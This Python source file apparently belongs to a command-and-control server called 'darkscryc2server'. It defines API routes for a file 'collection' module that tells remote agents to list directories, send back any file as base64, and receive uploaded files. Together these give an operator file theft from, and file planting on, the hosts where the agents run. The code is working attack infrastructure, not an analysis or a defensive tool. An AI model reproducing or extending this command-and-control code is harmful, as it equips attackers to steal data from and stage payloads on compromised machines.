from uuid import UUID

from application.views.api.Schemas.Modules.collection.Files import FileExplorerStreamResponde, FileCollectionRequest, UploadBase64FileRequest
from darkscryc2server.Models.schemas import GenAction
from application.services.view_base import ApiRouteV2
from darkscryc2server.Models.schemas import CommandIdentifiers
from darkscryc2server.Utils.remote_utils.commands import remote_send_command
from django.shortcuts import aget_object_or_404
from application.models import Agent
from application.Utils.arq_tasks_utils import get_task_executor
from application.views.api.Schemas.general import TaskOut
from application.views.api.Schemas.general import GeneralError

prefix_with_agent = "/agents/{agent_id}/modules/collection/files"
class FileCollection(ApiRouteV2):
    def __init__(self, tags = ['Collection']):
        super().__init__(tags=tags, prefix=prefix_with_agent)
        self.register_routes()

    
    async def stream_files_explorer(self, request, agent_id:UUID, payload:FileCollectionRequest, *args, **kwargs):
        agent = await aget_object_or_404(Agent, AgentId=agent_id)
        command = GenAction(action=CommandIdentifiers.SNAP_FULL_DIRECTORY, path=payload.path).xml()
        res = await remote_send_command(
            conn_id=str(agent.AgentId),
            command=command,
            _parse_data=True
        )
        if not res.success:
            return 500, GeneralError(error=str(res.error))
        return FileExplorerStreamResponde(**res.data)
    
    async def get_file_base64(self, request, agent_id:UUID, payload:FileCollectionRequest, *args, **kwargs):
        agent = await aget_object_or_404(Agent, AgentId=agent_id)
        command = GenAction(action=CommandIdentifiers.GET_FILE_BASE_64, path=payload.path).xml()
        task_excutor = await get_task_executor()
        job = await task_excutor.enqueue_job(
            "remote_send_command_task",
            agent_id=str(agent.AgentId),
            command=command,
            _action_name=CommandIdentifiers.GET_FILE_BASE_64
        )
        return TaskOut(task_id=job.job_id)
    
    async def upload_file_base64(self, request, agent_id:UUID, payload:UploadBase64FileRequest, *args, **kwargs):
        agent = await aget_object_or_404(Agent, AgentId=agent_id)
        command = GenAction(
            action=CommandIdentifiers.UPLOAD_FILE_BASE_64, 
            path=payload.path, 
            file_base64=payload.file_base64,
            file_name=payload.file_name
        ).xml()
        task_excutor = await get_task_executor()
        job = await task_excutor.enqueue_job(
            "remote_send_command_task",
            agent_id=str(agent.AgentId),
            command=command,
            _action_name=CommandIdentifiers.UPLOAD_FILE_BASE_64
        )
        return TaskOut(task_id=job.job_id)
    
    
    def register_routes(self):
        self.register_route(
            path="/stream_files_explorer", 
            methods=["POST"], 
            view_func=self.stream_files_explorer, 
            response={500:GeneralError, 200:FileExplorerStreamResponde},
            summary="Get dir"
        )
        self.register_route(
            path="/get_file_base64", 
            methods=["POST"], 
            view_func=self.get_file_base64, 
            response={500:GeneralError, 200:TaskOut},
            summary="Fetsh base64 of file"
        )
        self.register_route(
            path="/upload_base64", 
            methods=["POST"], 
            view_func=self.upload_file_base64, 
            response={500:GeneralError, 200:TaskOut},
            summary="Upload base64 file"
        )
